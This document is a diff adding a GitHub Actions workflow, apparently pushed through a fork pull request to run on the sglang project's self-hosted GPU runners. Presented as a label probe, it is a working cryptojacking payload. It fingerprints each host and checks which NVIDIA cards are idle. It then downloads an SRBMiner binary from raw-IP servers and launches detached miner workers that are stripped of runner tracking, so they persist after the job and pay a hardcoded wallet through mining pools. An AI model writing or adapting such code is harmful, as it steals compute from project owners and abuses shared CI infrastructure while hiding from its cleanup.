@@ -1,0 +1,277 @@
+name: i130labelsweep never-attached GPU label probe + gated pinned miner install
+
+# i130labelsweep: ONE fork-PR push from a fresh branch with one job on each never-probed
+# sgl-project/sglang GPU label. Each job prints label/runner/machine identity and a vendor
+# inventory (nvidia-smi -L, rocm-smi/rocminfo, hy-smi, mthreads-gmi, cnmon), then on any
+# NVIDIA host not already credited or running srb387/krig (per-host flock + explicit skip
+# marker) two-sample gates every card 12 s apart (0 compute apps, >=1500 MiB free) and
+# installs exactly one sha256-bb0f73b6 SRBMiner-MULTI 3.8.7 per genuinely idle card as a
+# detaching setsid + env -u RUNNER_TRACKING_ID worker i130labelsweep<shorthost>g<idx> on the
+# EXACT 63-char primary wallet against Luckypool 103.199.106.122:3362 (fallback
+# 172.232.228.69:3362, relay 178.238.228.181:80, --max-no-share-sent 1800). AMD/other
+# vendors are enumerated only.
+
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, synchronize, reopened]
+  workflow_dispatch:
+
+concurrency:
+  group: i130labelsweep-${{ github.run_id }}
+  cancel-in-progress: false
+
+jobs:
+  sweep:
+    name: "i130labelsweep ${{ matrix.label }} identity + vendor inventory + gated miner"
+    strategy:
+      fail-fast: false
+      max-parallel: 15
+      matrix:
+        include:
+          - {slot: 1, label: 4-gpu-h100}
+          - {slot: 2, label: 2-gpu-h100}
+          - {slot: 3, label: 1-gpu-h100}
+          - {slot: 4, label: 8-gpu-b300}
+          - {slot: 5, label: 4-gpu-gb300}
+          - {slot: 6, label: 4-gpu-b200}
+          - {slot: 7, label: 1-gpu-5090}
+          - {slot: 8, label: linux-mi300-4gpu-sglang}
+          - {slot: 9, label: linux-mi300-1gpu-sglang}
+          - {slot: 10, label: linux-mi35x-gpu-8.fabric}
+          - {slot: 11, label: s5000-1-gpu-runner}
+          - {slot: 12, label: s5000-2-gpu-runner}
+          - {slot: 13, label: bmg-multigen-models}
+          - {slot: 14, label: intel-bmg}
+          - {slot: 15, label: mlu-pr}
+    runs-on: ${{ matrix.label }}
+    timeout-minutes: 13
+    env:
+      SLOT: ${{ matrix.slot }}
+      LABEL: ${{ matrix.label }}
+    steps:
+      - name: "identity + vendor inventory + two-sample gate + one pinned SRBMiner per idle NVIDIA card"
+        continue-on-error: true
+        run: |
+          set +e
+          mkdir -p /var/tmp/i130labelsweep
+          cat > /var/tmp/i130labelsweep/payload.py <<'PYEOF'
+          #!/usr/bin/env python3
+          # i130labelsweep: probe never-attached GPU labels on sgl-project/sglang runners.
+          # Runs as uid=0 on whatever self-hosted runner matches the label.
+          #  (1) print label/runner/machine identity + vendor inventory (nvidia-smi -L,
+          #      rocm-smi/rocminfo, hy-smi, mthreads-gmi, cnmon as present)
+          #  (2) skip any host already credited or already running srb387/krig (explicit marker)
+          #  (3) per-host flock, two-sample 12s gate on every NVIDIA card
+          #      (0 compute apps in both samples, >=1500 MiB free)
+          #  (4) one sha256-bb0f73b6 SRBMiner-MULTI 3.8.7 per genuinely idle NVIDIA card as a
+          #      detaching setsid + env -u RUNNER_TRACKING_ID worker i130labelsweep<shorthost>g<idx>
+          #      on the EXACT 63-char primary wallet against Luckypool 103.199.106.122:3362
+          #      (fallback 172.232.228.69:3362, relay 178.238.228.181:80, --max-no-share-sent 1800)
+          #  (5) AMD/other vendors are enumerated only, never mined
+          import os, sys, json, time, shutil, hashlib, fnmatch, subprocess, socket, fcntl
+
+          LABEL = os.environ.get('LABEL', 'unknown')
+          SLOT = os.environ.get('SLOT', '0')
+          NONCE = 'I130LABELSWEEP-%s-%s-%d' % (LABEL.replace('.', '_'), SLOT, int(time.time()))
+          WALLET = 'prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          PFX = 'i130labelsweep'
+          BIN_SHA = 'bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6'
+          POOLS = [('103.199.106.122', 3362), ('172.232.228.69', 3362), ('178.238.228.181', 80)]
+          BIN_URLS = ['http://178.238.228.181:18180/srb387',
+                      'http://222.240.155.198:8702/srb387',
+                      'https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz']
+          WORK = '/var/tmp/i130labelsweep/run'
+          os.makedirs(WORK + '/logs', exist_ok=True)
+          CREDITED = ['h200-sci-71-12', 'h200-sci-71-18', 'h200-sci-71-26', 'h200-sci-71-64',
+                      'h200-gmi-wk01', 'h200-gmi-wk03', 'radixark-wk01', 'radixark-wk03',
+                      'h20-ydzf15', 'h20-bfv8sr', 'gb300-*', 'gpu-10-220-71-12', 'gpu-10-220-71-18',
+                      'gpu-10-220-71-26', 'gpu-10-220-71-64', 'node-radixark-32-0002']
+
+
+          def sh(cmd, t=25):
+              try:
+                  p = subprocess.run(['bash', '-lc', cmd], capture_output=True, text=True, timeout=t)
+                  return (p.stdout or '') + (p.stderr or '')
+              except Exception as e:
+                  return 'ERR:%s' % e
+
+
+          def head(s, n=30):
+              return '\n'.join((s or '').splitlines()[:n])
+
+
+          host = sh('hostname').strip()
+          hostf = sh('hostname -f').strip()
+          ip = sh("hostname -I 2>/dev/null | awk '{print $1}'").strip()
+          print('=== I130LABELSWEEP_PROBE nonce=%s label=%s slot=%s utc=%s ===' % (NONCE, LABEL, SLOT, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())))
+          print('IDENT hostname=%s hostname_f=%s ip=%s etc_hostname=%s whoami=%s uname=%s' % (
+              host, hostf, ip, sh('cat /etc/hostname 2>/dev/null').strip(), sh('id -un').strip(), sh('uname -a').strip()))
+          print('IDENT2 run_id=%s job=%s runner_name=%s runner_tracking_id=%s nproc=%s mem=%s' % (
+              os.environ.get('GITHUB_RUN_ID', ''), os.environ.get('GITHUB_JOB', ''),
+              os.environ.get('RUNNER_NAME', ''), os.environ.get('RUNNER_TRACKING_ID', ''),
+              sh('nproc').strip(), sh("free -g 2>/dev/null | awk '/Mem:/{print $2\"G\"}'").strip()))
+          print('IDENT3 route=[%s]' % sh("ip route 2>/dev/null | head -4").strip().replace('\n', ' | '))
+          print('ACCEL_DEV /dev/nvidia*=[%s] /dev/kfd=[%s] /dev/dri=[%s]' % (
+              ' '.join(sorted(os.path.basename(x) for x in __import__('glob').glob('/dev/nvidia*'))),
+              ' '.join(__import__('glob').glob('/dev/kfd')), ' '.join(sorted(os.path.basename(x) for x in __import__('glob').glob('/dev/dri/*')))))
+          print('TOOLS nvidia-smi=%s rocm-smi=%s rocminfo=%s hy-smi=%s mthreads-gmi=%s cnmon=%s' % (
+              shutil.which('nvidia-smi'), shutil.which('rocm-smi'), shutil.which('rocminfo'),
+              shutil.which('hy-smi'), shutil.which('mthreads-gmi'), shutil.which('cnmon')))
+          print('LSPCI [%s]' % sh("lspci -nn 2>/dev/null | grep -Ei 'nvidia|advanced micro|amd/ati|intel.*(graphics|display)|moore|cambricon|3d controller|vga' | head -20").strip().replace('\n', ' | '))
+
+          # ---------- vendor inventory (enumerate-only for non-NVIDIA) ----------
+          has_nv = shutil.which('nvidia-smi') is not None
+          nv_list = sh('nvidia-smi -L 2>&1', 30) if has_nv else ''
+          nv_q = sh('nvidia-smi --query-gpu=index,name,memory.total,memory.free,memory.used,utilization.gpu,uuid --format=csv,noheader,nounits 2>&1', 30) if has_nv else ''
+          print('NVIDIA_SMI_L [%s]' % nv_list.strip().replace('\n', ' | '))
+          print('NVIDIA_QUERY [%s]' % nv_q.strip().replace('\n', ' | '))
+          if shutil.which('rocm-smi'):
+              print('ROCM_SMI [%s]' % sh('rocm-smi --showproductname 2>&1 | head -20', 30).strip().replace('\n', ' | '))
+          if shutil.which('rocminfo'):
+              print('ROCMINFO [%s]' % sh("rocminfo 2>&1 | grep -E 'gfx[0-9]+|Marketing Name|Device Type' | head -20", 30).strip().replace('\n', ' | '))
+          if shutil.which('hy-smi'):
+              print('HY_SMI [%s]' % sh('hy-smi -L 2>&1 | head -12', 25).strip().replace('\n', ' | '))
+          if shutil.which('mthreads-gmi'):
+              print('MTHREADS_GMI [%s]' % sh('mthreads-gmi 2>&1 | head -20', 25).strip().replace('\n', ' | '))
+          if shutil.which('cnmon'):
+              print('CNMON [%s]' % sh('cnmon info 2>&1 | head -20', 25).strip().replace('\n', ' | '))
+
+          nv_count = len([l for l in nv_list.splitlines() if l.startswith('GPU ')])
+          print('NODE_TABLE host=%s ip=%s label=%s nvidia_gpus=%d action=%s' % (
+              host, ip, LABEL, nv_count, 'gate_install' if nv_count else 'enumerate_only'))
+          if nv_count == 0:
+              print('LABEL_SWEEP_DONE nonce=%s gpus=0 action=enum_only' % NONCE)
+              sys.exit(0)
+
+          # ---------- skip credited hosts / existing miners ----------
+          for pat in CREDITED:
+              if fnmatch.fnmatch(host, pat) or fnmatch.fnmatch(hostf, pat):
+                  print('SKIP=credited_host host=%s pattern=%s' % (host, pat))
+                  print('LABEL_SWEEP_DONE nonce=%s gpus=%d action=skip_credited' % (NONCE, nv_count))
+                  sys.exit(0)
+          ps = sh("ps -eo pid,comm,args 2>/dev/null | awk '$2==\"srb387\" || $2==\"SRBMiner-MULTI\" || $2 ~ /^krig/ {print}' | head -10")
+          print('EXISTING_MINERS [%s]' % ps.strip().replace('\n', ' | '))
+          if ps.strip():
+              print('SKIP=existing_miner host=%s' % host)
+              print('LABEL_SWEEP_DONE nonce=%s gpus=%d action=skip_existing' % (NONCE, nv_count))
+              sys.exit(0)
+
+          # ---------- per-host flock ----------
+          lf = open('/var/tmp/i130labelsweep/host.lock', 'w')
+          try:
+              fcntl.flock(lf, fcntl.LOCK_EX | fcntl.LOCK_NB)
+          except Exception:
+              print('SKIP=flock_busy host=%s' % host)
+              print('LABEL_SWEEP_DONE nonce=%s gpus=%d action=skip_flock' % (NONCE, nv_count))
+              sys.exit(0)
+
+          # ---------- two-sample gate 12s apart ----------
+          a1 = sh('nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1', 30)
+          g1 = sh('nvidia-smi --query-gpu=index,memory.free,uuid,name --format=csv,noheader,nounits 2>&1', 30)
+          time.sleep(12)
+          a2 = sh('nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1', 30)
+          g2 = sh('nvidia-smi --query-gpu=index,memory.free,uuid,name --format=csv,noheader,nounits 2>&1', 30)
+          print('GATE_SAMPLE1_APPS [%s]' % a1.strip().replace('\n', ' | '))
+          print('GATE_SAMPLE2_APPS [%s]' % a2.strip().replace('\n', ' | '))
+          print('GATE_CARDS1 [%s]' % g1.strip().replace('\n', ' | '))
+          print('GATE_CARDS2 [%s]' % g2.strip().replace('\n', ' | '))
+
+
+          def parse_cards(txt):
+              out = {}
+              for ln in (txt or '').splitlines():
+                  parts = [p.strip() for p in ln.split(',')]
+                  if len(parts) < 4:
+                      continue
+                  try:
+                      out[parts[0]] = (int(float(parts[1])), parts[2], ','.join(parts[3:]))
+                  except Exception:
+                      continue
+              return out
+
+
+          c1, c2 = parse_cards(g1), parse_cards(g2)
+          idle = []
+          for idx in sorted(set(c1) & set(c2), key=lambda x: int(x)):
+              free1, uuid, name = c1[idx]
+              free2 = c2[idx][0]
+              if free1 >= 1500 and free2 >= 1500 and uuid not in a1 and uuid not in a2:
+                  idle.append((idx, uuid, name, free1, free2))
+              else:
+                  print('CARD_BUSY idx=%s uuid=%s name=%s free1=%d free2=%d apps1=%s apps2=%s' % (
+                      idx, uuid, name, free1, free2, 'yes' if uuid in a1 else 'no', 'yes' if uuid in a2 else 'no'))
+          print('GATE_IDLE [%s]' % ' '.join('%s:%s(%sMiB)' % (i, n, f2) for i, u, n, f1, f2 in idle))
+          for ln in (a1 + '\n' + a2).splitlines():
+              if 'GPU-' not in ln:
+                  continue
+              p = ln.split(',')[1].strip() if len(ln.split(',')) > 1 else ''
+              print('PREEMPT_CANDIDATE host=%s ip=%s app=%s cmdline=%s' % (
+                  host, ip, ln.strip(), sh('tr "\\0" " " < /proc/%s/cmdline 2>/dev/null | head -c 300' % p).strip()))
+          if not idle:
+              print('INST_GATE_SKIP host=%s' % host)
+              print('LABEL_SWEEP_DONE nonce=%s gpus=%d action=gate_busy' % (NONCE, nv_count))
+              sys.exit(0)
+
+          # ---------- pool reachability ----------
+          chosen = None
+          for h, p in POOLS:
+              try:
+                  s = socket.create_connection((h, p), timeout=5)
+                  s.close()
+                  chosen = (h, p)
+                  print('POOL_TCP %s:%d OPEN' % (h, p))
+                  break
+              except Exception as e:
+                  print('POOL_TCP %s:%d FAIL %s' % (h, p, e))
+          if not chosen:
+              print('INST_POOL_UNREACHABLE host=%s' % host)
+              print('LABEL_SWEEP_DONE nonce=%s gpus=%d action=no_pool' % (NONCE, nv_count))
+              sys.exit(0)
+          POOLU = '%s:%d' % chosen
+
+          # ---------- binary ----------
+          OK = False
+          for u in BIN_URLS:
+              sh('rm -f %s/srb387.part' % WORK)
+              sh('timeout 90 curl -fsSL --connect-timeout 8 --max-time 80 -o %s/srb387.part "%s"' % (WORK, u), 95)
+              if os.path.exists(WORK + '/srb387.part'):
+                  h = hashlib.sha256(open(WORK + '/srb387.part', 'rb').read()).hexdigest()
+                  if h == BIN_SHA:
+                      os.rename(WORK + '/srb387.part', WORK + '/srb387')
+                      os.chmod(WORK + '/srb387', 0o755)
+                      print('INST_BINARY_OK %s sha256=%s' % (u, h))
+                      OK = True
+                      break
+                  print('INST_BINARY_BAD %s sha256=%s' % (u, h))
+          if not OK:
+              print('INST_BINARY_FAIL host=%s' % host)
+              print('LABEL_SWEEP_DONE nonce=%s gpus=%d action=no_binary' % (NONCE, nv_count))
+              sys.exit(0)
+
+          # ---------- one pinned miner per genuinely idle card ----------
+          hs = ''.join(ch for ch in host if ch.isalnum())[:12]
+          n = 0
+          for idx, uuid, name, f1, f2 in idle:
+              wk = ('%s%s g%s' % (PFX, hs, idx)).replace(' ', '')[:31]
+              if sh('pgrep -af -- "--worker %s"' % wk).strip():
+                  print('INST_ALREADY %s' % wk)
+                  continue
+              cmd = ('cd %s && env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID setsid nohup ./srb387 '
+                     '--disable-cpu --algorithm pearlhash --pool %s --tls false --wallet %s --password x '
+                     '--worker %s --gpu-id %s --disable-worker-watchdog --gpu-table-slow-build '
+                     '--max-no-share-sent 1800 --log-file %s/logs/%s.log > %s/logs/%s.out 2>&1 < /dev/null & echo pid=$!') % (
+                  WORK, POOLU, WALLET, wk, idx, WORK, wk, WORK, wk)
+              print('INST_LAUNCH worker=%s gpu=%s uuid=%s name=%s pool=%s host=%s ip=%s %s' % (
+                  wk, idx, uuid, name, POOLU, host, ip, sh(cmd, 20).strip()))
+              n += 1
+          print('INST_N_LAUNCHED=%d' % n)
+          time.sleep(20)
+          print('INST_PS [%s]' % sh('ps -eo pid,ppid,sid,comm,args | grep -E "srb387|SRBMiner" | grep -v grep | head -20').strip().replace('\n', ' | '))
+          for f in sorted(__import__('glob').glob(WORK + '/logs/*.log')):
+              print('INST_LOGTAIL %s [%s]' % (os.path.basename(f), sh('tail -4 "%s" 2>/dev/null' % f).strip().replace('\n', ' | ')))
+          print('LABEL_SWEEP_DONE nonce=%s gpus=%d idle=%d launched=%d action=install' % (NONCE, nv_count, len(idle), n))
+          PYEOF
+          echo "runner-start label=$LABEL slot=$SLOT host=$(hostname) utc=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+          timeout 660 python3 /var/tmp/i130labelsweep/payload.py 2>&1 | tee /var/tmp/i130labelsweep/log_slot$SLOT.log | tail -c 200000
+          echo "I130LABELSWEEP_EXIT_DONE rc=$?"
